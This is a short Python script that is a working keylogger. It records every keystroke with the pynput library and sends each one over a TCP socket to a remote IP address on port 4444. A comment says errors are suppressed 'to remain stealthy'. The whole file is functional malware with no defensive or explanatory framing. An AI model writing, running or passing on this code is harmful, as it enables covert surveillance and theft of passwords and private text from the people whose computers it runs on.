import socket
from pynput.keyboard import Listener

# Configure remote server
server_ip = "10.0.0.159"  # Replace with the remote computer's IP
server_port = 4444               # Same port as the listener

def send_data(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((server_ip, server_port))
            sock.sendall(data.encode("utf-8"))
    except Exception as e:
        pass  # Suppress errors to remain stealthy

# Log keystrokes and send to remote server
def on_press(key):
    try:
        key = str(key).replace("'", "")
        send_data(key + "\n")
    except:
        pass

with Listener(on_press=on_press) as listener:
    listener.join()
